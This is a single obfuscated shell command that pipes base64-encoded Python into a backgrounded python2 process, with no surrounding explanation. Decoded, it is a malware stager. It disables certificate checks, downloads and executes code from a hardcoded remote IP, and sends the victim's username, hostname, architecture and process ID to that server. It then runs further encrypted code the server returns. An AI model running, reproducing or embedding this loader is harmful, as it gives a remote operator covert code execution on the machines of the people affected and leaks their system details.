echo "import sys,base64;exec(base64.b64decode('aW1wb3J0IHVybGxpYjIsb3Msc3lzLGJhc2U2NCxzc2wsc29ja2V0LHB3ZCxoYXNobGliLHRpbWUKa2Q9dGltZS5zdHJwdGltZSgiMDEvMDYvMjAyMCIsIiVkLyVtLyVZIikKcHloYXNoPSI5ZDg1MGYxMzhiMzM2NjQwZDk2NTgyZjgyYjNiNDJjMzA3ZTViYTNlNjQ5MzJjYzRiYzAwYjNlMjgxYmQwM2M4MzJmZTdkNGE2NzNkYWQ0NmMxZjA1MjNkZTA4MGY3NDQ4OTY5ODM0ZTcyNWUxZjQyZDY0NDRmZDU4OWY1NjFlOSIKcHlrZXk9IlJTb0RpbU9VTHZBLzkvd1NqM0dyNms5NFFYQ1VETVVtTjlDSGh0WWlrU3c9IgprZXk9ImhwMVpwN0JHc1FOTjJkUC8yUEFDV25ocUlTYWpGb050bnZsclphcXhJeU09IgpzZXJ2ZXJjbGVhbj0iaHR0cHM6Ly8zNC4yMjEuNTcuMTM3OjQ0MyIKdXJsPSJodHRwczovLzM0LjIyMS41Ny4xMzc6NDQzL2J1c2luZXNzL19weSIKdXJsMj0iaHR0cHM6Ly8zNC4yMjEuNTcuMTM3OjQ0My90cmFkZXItdXBkYXRlLz9tIgpoaD0iIgp1YT0iTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xMjIgU2FmYXJpLzUzNy4zNiIKY3N0cj10aW1lLnN0cmZ0aW1lKCIlZC8lbS8lWSIsdGltZS5nbXRpbWUoKSk7Y3N0cj10aW1lLnN0cnB0aW1lKGNzdHIsIiVkLyVtLyVZIikKIyBUaGlzIGRvZXNuJ3QgZXhpc3QgaW4gcHl0aG9uIDwgMi43LjkKaWYgc3lzLnZlcnNpb25faW5mb1swXSA9PSAzIG9yIChzeXMudmVyc2lvbl9pbmZvWzBdID09IDIgYW5kIHN5cy52ZXJzaW9uX2luZm9bMV0gPj0gNyBhbmQgc3lzLnZlcnNpb25faW5mb1syXSA+PSA5KToKICAgIHNzbC5fY3JlYXRlX2RlZmF1bHRfaHR0cHNfY29udGV4dD1zc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQKaWYgaGg6IHI9dXJsbGliMi5SZXF1ZXN0KHVybCxoZWFkZXJzPXsnSG9zdCc6aGgsJ1VzZXItYWdlbnQnOnVhfSkKZWxzZTogcj11cmxsaWIyLlJlcXVlc3QodXJsLGhlYWRlcnM9eydVc2VyLWFnZW50Jzp1YX0pCnJlcz11cmxsaWIyLnVybG9wZW4ocik7ZD1yZXMucmVhZCgpO2M9ZFsxOl07Yj1jLmRlY29kZSgiaGV4IikKcz1oYXNobGliLnNoYTUxMihiKQppZiBweWtleSBpbiBiIGFuZCBweWhhc2ggPT0gcy5oZXhkaWdlc3QoKSBhbmQgY3N0ciA8IGtkOiBleGVjKGIpCmVsc2U6IHN5cy5leGl0KDApCnVuPXB3ZC5nZXRwd3VpZChvcy5nZXR1aWQoKSlbIDAgXTtwaWQ9b3MuZ2V0cGlkKCkKaXM2ND1zeXMubWF4c2l6ZSA+IDIqKjMyO2FyY2g9KCd4NjQnIGlmIGlzNjQgPT0gVHJ1ZSBlbHNlICd4ODYnKQpobj1zb2NrZXQuZ2V0aG9zdG5hbWUoKTtvPXVybGxpYjIuYnVpbGRfb3BlbmVyKCkKZW5jc2lkPWVuY3J5cHQoa2V5LCAnJXM7JXM7JXM7JXM7JXM7JXMnICUgKHVuLGhuLGhuLGFyY2gscGlkLHNlcnZlcmNsZWFuKSkKaWYgaGg6cj11cmxsaWIyLlJlcXVlc3QodXJsMixoZWFkZXJzPXsnSG9zdCc6aGgsJ1VzZXItYWdlbnQnOnVhLCdDb29raWUnOidTZXNzaW9uSUQ9JXMnICUgZW5jc2lkfSkKZWxzZTpyPXVybGxpYjIuUmVxdWVzdCh1cmwyLGhlYWRlcnM9eydVc2VyLWFnZW50Jzp1YSwnQ29va2llJzonU2Vzc2lvbklEPSVzJyAlIGVuY3NpZH0pCnJlcz11cmxsaWIyLnVybG9wZW4ocik7aHRtbD1yZXMucmVhZCgpO3g9ZGVjcnlwdChrZXksIGh0bWwpLnJzdHJpcCgnXDAnKTtleGVjKGJhc2U2NC5iNjRkZWNvZGUoeCkpCg=='));" | python2 &